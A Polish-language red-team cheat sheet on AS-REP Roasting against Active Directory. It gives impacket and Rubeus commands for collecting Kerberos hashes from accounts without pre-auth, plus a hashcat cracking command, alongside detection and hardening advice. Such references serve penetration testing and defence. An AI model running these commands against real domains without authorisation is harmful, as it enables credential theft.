---
title: "AS-REP Roasting"
category: "red-team"
tags: ["active-directory", "kerberos", "credential-access"]
platform: "windows"
mitre: ["T1558.004"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# AS-REP Roasting

## TL;DR
Konta z wyłączonym Kerberos pre-auth (`DONT_REQ_PREAUTH`) oddają zaszyfrowany hasłem fragment AS-REP **bez uwierzytelnienia** → offline crack. Nie potrzebujesz nawet ważnych poświadczeń, jeśli masz listę użytkowników.

## Komendy
```bash
# Bez poświadczeń – tylko lista userów
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat

# Z poświadczeniami – wyszukaj podatne konta
impacket-GetNPUsers corp.local/user:'Pass' -dc-ip 10.10.10.10 -request -format hashcat
```
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## Cracking
```bash
hashcat -m 18200 hashes.txt rockyou.txt   # Kerberos 5 AS-REP etype 23
```

## Wykrywanie (Blue Team)
- Event **4768** (AS-REQ) z pre-auth type 0 / brak pre-auth.
- Enumeracja wielu kont bez pre-auth z jednego źródła.

## Mitygacja / Hardening
- Włącz Kerberos pre-auth na wszystkich kontach (usuń `DONT_REQ_PREAUTH`).
- Długie hasła/AES; audytuj konta z tą flagą:
```powershell
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
```

## Źródła
- [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/004/)
